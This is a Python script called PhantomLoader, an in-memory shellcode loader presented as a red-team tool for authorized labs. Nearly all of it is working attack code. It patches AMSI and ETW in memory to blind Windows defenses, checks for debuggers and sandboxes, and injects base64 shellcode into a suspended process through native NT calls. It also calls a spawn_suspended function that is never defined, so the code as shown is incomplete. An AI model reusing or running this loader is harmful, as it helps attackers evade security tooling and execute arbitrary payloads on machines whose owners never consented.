#!/usr/bin/env python3
# PhantomLoader.py - Advanced In-Memory Payload Loader & Evasion (2026 Red Team Hard-Target)
# Hand-coded for authorized testing only: syscall injection, AMSI/ETW bypass, anti-analysis
# EPO - Lab / Explicit Written Permission ONLY! 💀

import sys
import os
import time
import base64
import ctypes
import ctypes.wintypes as wintypes
import datetime
import random
import subprocess
import platform
import struct

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll
amsi = ctypes.windll.LoadLibrary("amsi.dll") if os.path.exists("C:\\Windows\\System32\\amsi.dll") else None

# Syscall numbers (Windows 11 24H2 - always verify!)
NT_CREATE_USER_PROCESS = 0xB7
NT_ALLOCATE_VIRTUAL_MEMORY = 0x18
NT_WRITE_VIRTUAL_MEMORY = 0x3A
NT_CREATE_THREAD_EX = 0xC2
NT_QUEUE_APC_THREAD = 0x45
NT_RESUME_THREAD = 0x4F
NT_DELAY_EXECUTION = 0x34

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4

class STARTUPINFO(wintypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPCSTR), ("lpDesktop", wintypes.LPCSTR),
        ("lpTitle", wintypes.LPCSTR), ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD), ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD), ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD), ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(wintypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
    ]

def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_debugged():
    return kernel32.IsDebuggerPresent() != 0

def is_sandbox():
    """Multi-layer sandbox/VM detect"""
    checks = [
        is_debugged(),
        "VMware" in platform.node() or "Virtual" in platform.node(),
        os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys"),
        len(os.listdir("C:\\")) < 5  # small disk = sandbox
    ]
    return any(checks)

def amsi_bypass_patch():
    """Aggressive AMSI bypass (AmsiScanBuffer return 0)"""
    if not amsi:
        print(f"[{timestamp()}] AMSI.dll not found")
        return
    try:
        # Patch AmsiScanBuffer to return S_OK (0)
        amsi_addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
        # Write return 0; ret
        patch = bytes([0x33, 0xC0, 0xC3])  # xor eax,eax; ret
        written = ctypes.c_size_t()
        kernel32.WriteProcessMemory(-1, amsi_addr, patch, len(patch), ctypes.byref(written))
        print(f"[{timestamp()}] AMSI patch applied (lab mode)")
    except:
        print(f"[{timestamp()}] AMSI patch failed")

def etw_bypass_patch():
    """Basic ETW disable (EtwEventWrite return 0)"""
    try:
        ntdll.EtwEventWrite.restype = wintypes.ULONG
        # Patch with return 0; ret
        patch = bytes([0x33, 0xC0, 0xC3])
        written = ctypes.c_size_t()
        kernel32.WriteProcessMemory(-1, ntdll.EtwEventWrite, patch, len(patch), ctypes.byref(written))
        print(f"[{timestamp()}] ETW patch applied")
    except:
        print(f"[{timestamp()}] ETW patch failed")

def sleep_obfuscated(seconds: int):
    """Ekko-style sleep obfuscation using NtDelayExecution"""
    for _ in range(seconds):
        jitter = random.randint(800, 1200)
        delay = ctypes.c_longlong(-jitter * 10000)  # negative = relative
        ntdll.NtDelayExecution(False, ctypes.byref(delay))

def inject_shellcode(h_process, shellcode: bytes):
    """Direct syscall injection (NtAllocate + NtWrite + NtCreateThreadEx)"""
    base_addr = ctypes.c_void_p()
    region_size = ctypes.c_size_t(len(shellcode))

    status = ntdll.NtAllocateVirtualMemory(
        h_process, ctypes.byref(base_addr), 0,
        ctypes.byref(region_size), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    if status != 0:
        print(f"[{timestamp()}] Allocate failed: 0x{status:08x}")
        return False

    written = ctypes.c_size_t(0)
    status = ntdll.NtWriteVirtualMemory(
        h_process, base_addr, shellcode, len(shellcode), ctypes.byref(written)
    )
    if status != 0:
        print(f"[{timestamp()}] Write failed: 0x{status:08x}")
        return False

    thread = ctypes.c_void_p()
    status = ntdll.NtCreateThreadEx(
        ctypes.byref(thread), 0x1FFFFF, None, h_process,
        base_addr, None, False, 0, 0, 0, None
    )
    if status != 0:
        print(f"[{timestamp()}] Thread failed: 0x{status:08x}")
        return False

    print(f"[{timestamp()}] Payload injected & executed at 0x{base_addr.value:x}")
    return True

def main():
    if len(sys.argv) < 4:
        print("Usage:")
        print("  python PhantomLoader.py execute <target.exe> <base64_shellcode> [--bypass-all] [--evasion-deep]")
        sys.exit(1)

    if not is_admin():
        print(f"[{timestamp()}] ERROR: Must run as Administrator!")
        sys.exit(1)

    target = sys.argv[2]
    shellcode_b64 = sys.argv[3]

    try:
        shellcode = base64.b64decode(shellcode_b64)
        print(f"[{timestamp()}] Payload loaded: {len(shellcode)} bytes")
    except:
        print(f"[{timestamp()}] Invalid shellcode")
        sys.exit(1)

    if "--bypass-all" in sys.argv:
        amsi_bypass_patch()
        etw_bypass_patch()

    if "--evasion-deep" in sys.argv:
        print(f"[{timestamp()}] Evasion status:")
        print(f"  Debugger: {is_debugged()}")
        print(f"  Sandbox/VM: {is_sandbox()}")

    h_process, h_thread = spawn_suspended(target)
    if not h_process:
        sys.exit(1)

    success = inject_shellcode(h_process, shellcode)

    if success:
        print(f"[{timestamp()}] PhantomLoader success – payload live")
    else:
        print(f"[{timestamp()}] Injection failed")

    kernel32.ResumeThread(h_thread)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[{timestamp()}] Interrupted")
    except Exception as e:
        print(f"[{timestamp()}] Fatal: {e}")